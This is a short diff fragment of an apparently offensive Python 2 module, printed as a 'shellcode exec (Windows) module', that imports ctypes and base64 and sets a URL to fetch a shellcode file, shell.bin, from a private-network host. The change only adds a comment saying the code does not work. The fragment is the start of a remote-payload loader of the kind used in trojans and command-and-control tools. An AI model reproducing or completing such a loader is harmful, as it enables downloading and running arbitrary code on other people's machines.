@@ -2,6 +2,7 @@ import urllib2
 import ctypes
 import base64
 
+#### THIS DOES NOT WORK!!!! ######
 def run(**args):
     url = "http://172.16.153.1:8000/shell.bin"
     print "[*] In shellcode exec (Windows) module."
